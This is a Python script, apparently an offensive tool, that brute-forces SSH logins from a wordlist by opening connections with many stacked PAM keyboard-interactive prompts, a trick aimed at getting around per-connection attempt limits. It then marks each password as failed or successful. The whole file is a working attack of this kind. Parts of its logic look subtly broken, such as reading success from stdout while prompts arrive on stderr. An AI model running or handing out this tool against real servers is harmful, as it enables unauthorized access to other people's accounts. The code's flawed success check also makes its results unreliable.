#!/usr/bin/env python3

import sys
import subprocess
import time

CHUNK = 10

if len(sys.argv) != 4:
    print('Usage: ./brute_ssh_keyboard.py server user filename')
    sys.exit()

def get_password(filename):
    with open(filename) as f:
        for line in f:
            word = line.strip('\r\n')
            yield '{0}\n'.format(word).encode('utf-8')


def get_ssh_connection(server, user):
    """
    Brute force the SSH server.

    Open a connection to the SSH server and configure it for 1000 keyboard
    interactive sessions.
    """
    cmd = 'ssh -l {0} -o KbdInteractiveDevices={1} {2}'.format(user, 'pam,' * CHUNK, server)

    ssh = subprocess.Popen(cmd,
                           stdin=subprocess.PIPE,
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE,
                           bufsize=1,
                           shell=True)

    # Continue reading output lines until we get a Password prompt.
    out = ssh.stderr.readline()
    print('OUTPUT: {0}'.format(out.rstrip().decode('utf-8')))
    
    count = 0
    while 'Password' not in out.decode('utf-8'):
        print('OUTPUT: {0}'.format(out.decode('utf-8')))
        time.sleep(1)
        #out = ssh.stdout.read(8)
        err = ssh.stderr.read(8)
        print('ERR: {0}'.format(err))
        count += 1
        if count == 20: sys.exit()
    return ssh


if __name__ == '__main__':
    """
    Main Loop

    Open a connection to the SSH server and feed it CHUNK number of passwords.
    Create a new connection after each CHUNK is finished.
    """
    server = sys.argv[1]
    user = sys.argv[2]
    word_file = sys.argv[3]
    count = CHUNK

    ssh = get_ssh_connection(server, user)

    for word in get_password(word_file):
        # Send a password and capture the output
        ssh.stdin.write(word)
        out = ssh.stdout.readline()
        
        # Determine success or failure
        if 'Password' in out.decode('utf-8'):
            print('{0}:{1} - Failed'.format(user, word))
        else:
            print('{0}:{1} - Success'.format(user, word))

        # Get a new SSH session after every CHUNK of passwords.
        count += 1
        if count % CHUNK == 0:
            ssh.kill()
            ssh = get_ssh_connection(server, user)
